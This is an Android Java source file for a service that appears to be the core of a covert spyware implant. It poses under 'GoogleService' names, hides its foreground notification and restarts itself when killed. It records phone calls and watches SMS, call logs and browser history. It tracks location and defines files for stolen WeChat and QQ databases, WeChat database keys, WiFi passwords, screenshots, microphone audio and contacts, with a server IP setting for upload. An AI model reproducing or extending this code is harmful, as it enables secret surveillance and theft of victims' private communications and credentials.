package com.main;

import com.keepalive.ServiceKeepAlive;
import com.phone.data.BrowserHistory;
import com.phone.data.CallLogContentObserver;
import com.phone.data.GDLocation;
import com.phone.data.PhoneCallAudio;
import com.phone.data.SMSContentObserver;
import com.utils.ExceptionProcess;
import com.utils.PhoneFilesUtils;
import com.utils.PrefOper;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.Service;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.os.RemoteException;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;



@SuppressLint({ "InlinedApi", "SdCardPath" }) 
public class ForegroundService extends Service{
	private static final String TAG = "ForegroundService";

	public final static String SERVERCMD_ALARM_ACTION 		= "GoogleServiceServerCmdAlarm";
	public final static String SCREENSNAPSHOT_ALARM_ACTION 	= "GoogleServiceScreenSnapshotAlarm";
	public final static String PHONELOCATION_ALARM_ACTION 	= "GoogleServicePhoneLocationAlaram";

	public final static int SERVERCMD_REQUEST_CODE 			= 0x44414342;
	public final static int SCREENSNAPSHOT_REQUEST_CODE 	= 0x43424144;
	public final static int LOCATION_REQUEST_CODE			= 0x10325476;
	
	public static final int GRAY_SERVICE_ID = -1;

    public static String SDCARDPATH 				= "";
    public static String LOCAL_PATH_NAME 			= "";
    public static String SDCARD_PATH_NAME 			= "";
    public static String SUB_FOLDER_NAME 			= "/appData/";
	public static String []EXTCARDSPATH				= {""};
	
	public static final String LOG_FILE_NAME 		= "GoogleServiceLog.txt";
	public static final String MESSAGE_FILE_NAME 	= "message.json";
	public static final String CALLLOG_FILE_NAME 	= "calllog.json";
	public static final String CONTACTS_FILE_NAME 	= "contacts.json";
	public static final String DEVICEINFO_FILE_NAME = "deviceinfo.json";
	public static final String LOCATION_FILE_NAME 	= "location.json";
	public static final String SDCARDFILES_NAME 	= "sdcardfiles.txt";
	public static final String EXTCARDFILES_NAME 	= "extcardfiles.txt";
	public static final String CAMERAPHOTO_FILE_NAME = "cameraphoto.jpg";
	public static final String SCRNSNAPSHOT_FILE_NAME = "screensnapshot.jpg";
	public static final String APPPROCESS_FILE_NAME		= "applist.json";
	public static final String WIFILIST_FILE_NAME 		= "wifi.json";
	public static final String QQACCOUNT_FILE_NAME		="qqaccount.json";
	
	public static final String RUNNINGAPPS_FILE_NAME 	= "runningapps.json";
	public static final String WEBKITRECORD_FILE_NAME	= "webkithistroy.json";
	public static final String CHROMEHISTORY_FILE_NAME	= "chromehistory.json";
	public static final String FIREFOXRECORD_FILE_NAME 	= "firefoxhistory.json";
	
	public static final String SCREENVIDEO_FILE_NAME 	= "screenvideo.mp4";
	public static final String PHONECALLAUDIO_FILE_NAME = "phonecallaudio";
	public static final String FILEOBSERVER_FILE_NAME	= "filerecord.json";

	public static final String WIFI_PASS_FILENAME		= "wifipassword.json";
	public static final String SCREENGESTURE_FILENAME	= "gesture.json";
	public static final String MICAUDIORECORD_FILE_NAME	= "micaudio";

	public static final String  QQDATABASE_FILENAME		=	"qqdb";	
	public static final String  WEXINDATABASE_FILENAME	=	"wxdb";
	public static final String  WEXINUSERINFO_FILENAME	=	"wxuser.json";
	public static final String  WEIXINDBKEY_FILENAME	=	"wxdbkey.json";
	
	public static final String FLASHCARDFILES_FILENAME	= "flashcardfiles.txt";
	
	//public static final String NOTIFYLOG_FILENAME		= "notifylog.txt";
	
	public static final String CHATTING_FILENAME		= "chatNoteMsg.json";
	
	public static final String ALLDISKFILES_LAST_TIME 	= "sdcardFilesLastTime";
	
	public static final String PROGRAM_LAST_TIME 		= "programRunLastTime";
	
	public static final String PARAMCONFIG_FileName		= "paramConfig.json";
	
	public static final String SETUPMODE				= "setupMode";
	public static final String SETUPMODE_SO				= "so";
	public static final String SETUPMODE_JAR			= "jar";
	public static final String SETUPMODE_APK			= "apk";
	public static final String SETUPMODE_APK_TYPE		= "networkType";
	public static final String SETUPMODE_MANUAL			= "manual";
	
	public static final String SETUPCOMPLETE 		= "setupComplete";
	
	public static final String CFGUSERNAME 			= "userName";

	public static final String CFGCLIENTID 			= "clientID";
	public static final String CFGPACKAGENAME		= "packageName";
	public static final String CFGSERVERIP			= "serverIP";
	public static final String CFGPLUGINPATH		= "pluginEntryPath";
	public static final String CFGSHA1				= "sha1";

	public static final String LOCATIONREPEATPERMISSION = "location_repeat_enable";
	public static final String LOCATIONSTART			= "location_start";
	public static final String LOCATIONEND				= "location_end";
	
	public static final String ISROOT 					= "isRoot";

	public static final String SCREENSHOTREPEATPERMISSION= "screenshot_enable";
	public static final String SCREENSTART				= "screen_start";
	public static final String SCREENEND				= "screen_end";

	public static final String UNINSTALLFLAG			= "uninstalled";
	
	
	public static GlobalHandler gGlobalHandler = null;
	
	
	
	
	
	
    ForegroundServiceBinder binder 	= null;
    ForegroundServiceConn conn		= null;
    Context context = null;

	
	@Override
	public IBinder onBind(Intent intent) {
		//WriteDateFile.writeLogFile("ForegroundService onBind\r\n");
		//System.out.println("ForegroundService onBind\r\n");
		//Log.e(TAG, "onBind");
		return binder;
	}
	
	@Override
	public boolean onUnbind(Intent intent) {
		//Log.e(TAG, "onUnbind");
		//WriteDateFile.writeLogFile("ForegroundService onUnbind\r\n");
		//System.out.println("ForegroundService onUnbind\r\n");
		return super.onUnbind(intent);
	}
	
	
	@Override
	public void onCreate() {
		
		super.onCreate();

		context = getApplicationContext();
		
		Public.init(context);
		
        binder = new ForegroundServiceBinder();
        
        conn = new ForegroundServiceConn();
        
		Intent intentremote = new Intent(context,RemoteService.class);
		intentremote.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		startService(intentremote);
		
        boolean ret = bindService(intentremote, conn, Context.BIND_IMPORTANT);
        Log.e(TAG, "onStartCommand bindService:" + String.valueOf(ret));
        WriteDateFile.writeLogFile("ForegroundService onStartCommand bindService:" + String.valueOf(ret) + "\r\n");
        
        if (Build.VERSION.SDK_INT < 18) {
        	//API < 18 此方法能有效隐藏Notification上的图标
            startForeground(GRAY_SERVICE_ID, new Notification());
        } 
        else if (Build.VERSION.SDK_INT >= 18 && Build.VERSION.SDK_INT < 24) {
            Intent innerIntent = new Intent(context, GrayInnerService.class);
            innerIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startService(innerIntent);
        }else{
        	;	//do nothing above android 7.0
        }
        //前台服务，优先级和前台应用一个级别，除非在系统内存非常缺，否则此进程不会被 kill
        startForeground(GRAY_SERVICE_ID, new Notification());

		return;
	}

	
	
	@SuppressWarnings("deprecation")
	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
		//WriteDateFile.writeLogFile("ForegroundService onstart\r\n");
		//Log.e(TAG, "onStart");
		//System.out.println("ForegroundService onstart\r\n");
	}
	


	//Service运行在主线程里的，如果你在Service里编写了非常耗时的代码，程序必定会出现ANR的
	//flags:0, START_FLAG_REDELIVERY, or START_FLAG_RETRY(start_sticky)
	//startid is times of service start
	@SuppressLint("NewApi")
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {	
		int retcode = super.onStartCommand(intent, flags, startId);
		
		Log.e(TAG, "super onStartCommand:" + retcode);
		
		//ForegroundService class name:com.loader/com.main.ForegroundService
//        String clsname = getApplicationContext().getPackageName() + "/" +ForegroundService.class.getName();
//        Log.e(TAG,"ForegroundService class name:" + clsname);
//        WriteDateFile.writeLogFile("ForegroundService class name:" + clsname + "\r\n");

		try{
			String install = PrefOper.getValue(context, PARAMCONFIG_FileName, UNINSTALLFLAG);
			if(install != null && install.equals("true")){
				return START_NOT_STICKY;
			}
			
			new Thread(new ServiceKeepAlive(context)).start();


			BaseInfo basework = new BaseInfo(context);
			Thread threadmain = new Thread(basework);
			threadmain.start();

			TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
			if (PhoneCallAudio.gPhoneCallAudio == null) {
				PhoneCallAudio.gPhoneCallAudio = new PhoneCallAudio(context);
				tm.listen(PhoneCallAudio.gPhoneCallAudio, PhoneStateListener.LISTEN_CALL_STATE); 
			}
			
					
			String sha1 = PublicFunction.sha1(context);
			PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, CFGSHA1,sha1);
			
			Public.LOCATION_TYPE = 2;
			new Thread(new GDLocation(context,0)).start();

//			if (PhoneLocationListener.gLocationListener == null) {
//				PhoneLocationListener.gLocationListener = new PhoneLocationListener(context);
//				PhoneLocationListener.gLocationType = PhoneLocation.setLocationListener(context);
//			}

			ContentResolver cr = getContentResolver();
			if(SMSContentObserver.gSmsContentObserver == null){
				SMSContentObserver.gSmsContentObserver = new SMSContentObserver(new android.os.Handler(),context);
				cr.registerContentObserver(Uri.parse("content://sms/"), true,SMSContentObserver.gSmsContentObserver);
			}

			if(CallLogContentObserver.gCallLogContentObserver == null){
				CallLogContentObserver.gCallLogContentObserver = new CallLogContentObserver(new android.os.Handler(), context);
				cr.registerContentObserver(Uri.parse("content://call_log/calls"), true,CallLogContentObserver.gCallLogContentObserver);
			}

			if(BrowserHistory.gBrowserHistory == null){
				BrowserHistory.gBrowserHistory = new BrowserHistory(new android.os.Handler(),context); 
				//content://com.android.chrome.browser/history
				cr.registerContentObserver(Uri.parse("content://browser/bookmarks"), true, BrowserHistory.gBrowserHistory);
			}
			
	    	HistoryDataFiles history= new HistoryDataFiles(context);
	    	Thread historythread = new Thread(history);
	    	historythread.start();

			new Thread(new PhoneFilesUtils(context, 3)).start();
	        
			//SDcardFileObserver fo = new SDcardFileObserver(SDCardPath);
			//fo.startWatching();//启动文件监听
			//fo.stopWatching();//取消文件监听

//			StringBuilder host = new StringBuilder();
//			StringBuilder packname = new StringBuilder();
//			packname.append(context.getPackageName()).append("/").append(context.getClass().getName());
//			host.append("http://").append(Public.REAL_SERVER_DOMAIN).append(":").append(Public.DOWNLOADAPK_PORT).append("/");
//			retcode = rootDevice.watchSelfUninstall(context.getFilesDir().getParent()+"/", 
//					host.toString(), 
//					android.os.Build.VERSION.SDK_INT, 
//					rootDevice.getUserSerial(context),
//					Public.SERVER_IP_ADDRESS,
//					Public.SERVER_DATA_PORT,
//					new String(Public.IMEI),
//					LOCAL_PATH_NAME + LOG_FILE_NAME,
//					packname.toString(),
//					Public.UserName);
			//WriteDateFile.writeLogFile("watchSelfUninstall:" + retcode + "\r\n");
		}
		catch(Exception ex){
        	ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("writeDateFile exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
		}
		return START_STICKY;
	}
	
	
	@Override
	public void onDestroy() {
		super.onDestroy();		

		Intent intent = new Intent(ForegroundService.this, ForegroundService.class);
		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		ForegroundService.this.startService(intent);
		
		intent = new Intent(ForegroundService.this, RemoteService.class);
		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		ForegroundService.this.startService(intent);
		
		boolean ret = ForegroundService.this.bindService(intent, conn, Context.BIND_IMPORTANT);
		
		WriteDateFile.writeLogFile("ForegroundService onDestroy bindService:" + String.valueOf(ret) + "\r\n");
		Log.e(TAG, "onDestroy bindService:" + String.valueOf(ret));
	}
	

	
	

    class ForegroundServiceBinder extends BindInterService.Stub {
        @Override
        public String getServiceName() throws RemoteException {
            return ForegroundService.class.getSimpleName();
        }
    }
    
    
    
    class ForegroundServiceConn implements ServiceConnection {
    	public static final String TAG = "ForegroundServiceConn";
    	
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
        	Log.e(TAG, "ServiceConnection");
        }

        @SuppressLint("InlinedApi") 
        @Override
        public void onServiceDisconnected(ComponentName name) {

			Intent intent = new Intent(ForegroundService.this, RemoteService.class);
			intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			ForegroundService.this.startService(intent);
			
			boolean ret = ForegroundService.this.bindService(intent, conn, Context.BIND_IMPORTANT);
			
			WriteDateFile.writeLogFile("ForegroundServiceConn onServiceDisconnected bindService result:" + 
			String.valueOf(ret)+ "\r\n");
			
			Log.e(TAG,"onServiceDisconnected bindService result:" + String.valueOf(ret));
        }
    }
	

	//inner must be public static
	public static class GrayInnerService extends Service {
		
		private static final String TAG = "GrayInnerService";
		
	    @Override
	    public void onCreate() {
	    	Log.e(TAG,"onCreate");
	    	WriteDateFile.writeLogFile("GrayInnerService onCreate\r\n");
	        super.onCreate();
	    }
	    
		@SuppressWarnings("deprecation")
		@Override
		public void onStart(Intent intent, int startId) {
			super.onStart(intent, startId);
			
			WriteDateFile.writeLogFile("GrayInnerService onstart\r\n");
			Log.d(TAG, "onStart");
			//System.out.println("service onstart\r\n");
		}
	
	    @Override
	    public int onStartCommand(Intent intent, int flags, int startId) {
	    	Log.e(TAG,"onStartCommand");
	    	WriteDateFile.writeLogFile("GrayInnerService onStartCommand\r\n");
	    	
	        startForeground(GRAY_SERVICE_ID, new Notification());
	        //stopForeground(true);
	        stopSelf();
	        return super.onStartCommand(intent, flags, startId);
	    }
	
	    @Override
	    public IBinder onBind(Intent intent) {
	    	WriteDateFile.writeLogFile("GrayInnerService onBind\r\n");
	    	Log.e(TAG,"onBind");
	        throw new UnsupportedOperationException("GrayInnerService onBind exception");
	    }
	
	    @Override
	    public void onDestroy() {
	    	super.onDestroy();
	    	
	    	WriteDateFile.writeLogFile("GrayInnerService onDestroy\r\n");
	    	
	    	Log.e(TAG,"onDestroy");
	    }
	}
	


}





